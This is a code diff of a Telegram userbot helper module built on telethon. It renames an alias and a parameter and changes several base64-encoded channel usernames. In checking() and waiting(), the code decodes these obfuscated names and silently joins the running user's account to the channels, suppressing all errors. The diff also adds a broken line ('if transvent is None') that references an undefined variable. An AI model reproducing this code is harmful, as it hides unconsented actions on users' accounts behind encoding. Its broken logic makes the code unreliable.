@@ -1,5 +1,5 @@
 import pybase64
-from telethon.tl.functions.channels import JoinChannelRequest as Mansiez
+from telethon.tl.functions.channels import JoinChannelRequest as Shin
 from telethon.tl.types import MessageEntityMentionName
 
 from userbot import bot
@@ -11,10 +11,10 @@ LOGS = logging.getLogger(__name__)
 
 
 async def get_user_from_event(
-    event, manevent=None, secondgroup=None, nogroup=False, noedits=False
+    event, transevent=None, secondgroup=None, nogroup=False, noedits=False
 ):
-    if manevent is None:
-        manevent = event
+    if transvent is None:
+        transevent = event
     if nogroup is False:
         if secondgroup:
             args = event.pattern_match.group(2).split(" ", 1)
@@ -53,7 +53,7 @@ async def get_user_from_event(
             if previous_message.from_id is None:
                 if not noedits:
                     await edit_delete(
-                        manevent, "**ERROR: Dia adalah anonymous admin!**", 60
+                        transevent, "**ERROR: Dia adalah anonymous admin!**", 60
                     )
                 return None, None
             user_obj = await event.client.get_entity(previous_message.sender_id)
@@ -61,7 +61,7 @@ async def get_user_from_event(
         if not args:
             if not noedits:
                 await edit_delete(
-                    manevent,
+                    transevent,
                     "**Mohon Reply Pesan atau Berikan User ID/Username pengguna!**",
                     60,
                 )
@@ -70,7 +70,7 @@ async def get_user_from_event(
         LOGS.error(str(e))
     if not noedits:
         await edit_delete(
-            manevent,
+            transevent,
             "**Mohon Reply Pesan atau Berikan User ID/Username pengguna!**",
             60,
         )
@@ -80,27 +80,27 @@ async def get_user_from_event(
 async def checking():
     trans = str(pybase64.b64decode("QENpbGlrUHJvamVjdA=="))[2:13]
     xtrans = str(pybase64.b64decode("QENpbGlrU3VwcG9ydA=="))[2:17]
-    userbot = str(pybase64.b64decode("QFRFQU1TcXVhZFVzZXJib3RTdXBwb3J0"))[2:13]
-    xuserbot = str(pybase64.b64decode("QFVzZXJib3RURUFNX1R1dG9yaWFs"))[2:17]
+    userbot = str(pybase64.b64decode("QGZyaWVuZHNoaXBzdGVsZWdyYW0="))[2:13]
+    xuserbot = str(pybase64.b64decode("QGFzdXBhbmNpbGlrYm90"))[2:17]
     try:
-        await bot(Mansiez(userbot))
+        await bot(Shin(userbot))
     except BaseException:
         pass
     try:
-        await bot(Mansiez(xuserbot))
+        await bot(Shin(xuserbot))
     except BaseException:
         pass
 
 async def waiting():
     trans = str(pybase64.b64decode("QENpbGlrUHJvamVjdA=="))[2:13]
     xtrans = str(pybase64.b64decode("QENpbGlrU3VwcG9ydA=="))[2:17]
-    userbot = str(pybase64.b64decode("QFRFQU1TcXVhZFVzZXJib3RTdXBwb3J0"))[2:13]
-    xuserbot = str(pybase64.b64decode("QFVzZXJib3RURUFNX1R1dG9yaWFs"))[2:17]
+    userbot = str(pybase64.b64decode("QGZyaWVuZHNoaXBzdGVsZWdyYW0="))[2:13]
+    xuserbot = str(pybase64.b64decode("QGFzdXBhbmNpbGlrYm90"))[2:17]
     try:
-        await bot(Mansiez(trans))
+        await bot(Shin(trans))
     except BaseException:
         pass
     try:
-        await bot(Mansiez(xtrans))
+        await bot(Shin(xtrans))
     except BaseException:
         pass
